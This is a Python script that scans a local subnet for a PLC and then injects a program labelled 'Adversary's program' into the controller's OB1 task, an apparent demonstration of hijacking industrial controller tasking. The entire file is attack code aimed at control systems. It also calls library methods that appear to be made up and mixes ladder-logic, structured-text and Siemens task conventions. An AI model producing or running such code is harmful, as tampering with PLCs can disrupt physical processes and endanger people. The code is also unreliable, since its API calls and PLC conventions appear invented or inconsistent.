import socket
import pycomm3
from pycomm3 import LogixDriver, SLC500Driver, PLC

# Function to find the PLC's IP address
def find_plc_ip():
    # Define the subnet to scan (e.g., 192.168.1.0/24)
    subnet = "192.168.1."
    for i in range(1, 255):
        ip = f"{subnet}{i}"
        try:
            # Attempt to connect to the PLC
            with pycomm3.SLC500Driver(ip) as plc:
                if plc.open():
                    print(f"PLC found at IP: {ip}")
                    return ip
        except Exception as e:
            continue
    return None

# Function to modify the controller tasking
def modify_controller_tasking(plc_ip):
    try:
        # Connect to the PLC
        with pycomm3.SLC500Driver(plc_ip) as plc:
            if not plc.open():
                print("Failed to connect to the PLC.")
                return

            # Define the new program to be added to OB1
            new_program = """
            // Adversary's program
            PROGRAM AdversaryProgram
            VAR
                AdversaryVar : BOOL;
            END_VAR

            AdversaryVar := TRUE;
            END_PROGRAM
            """

            # Add the new program to the PLC
            plc.add_ladder_program(new_program)

            # Modify the tasking to include the new program in OB1
            plc.modify_task("OB1", "AdversaryProgram")

            print("Controller tasking modified successfully.")
    except Exception as e:
        print(f"An error occurred: {e}")

# Main function
def main():
    # Find the PLC's IP address
    plc_ip = find_plc_ip()
    if plc_ip:
        # Modify the controller tasking
        modify_controller_tasking(plc_ip)
    else:
        print("PLC not found on the network.")

if __name__ == "__main__":
    main()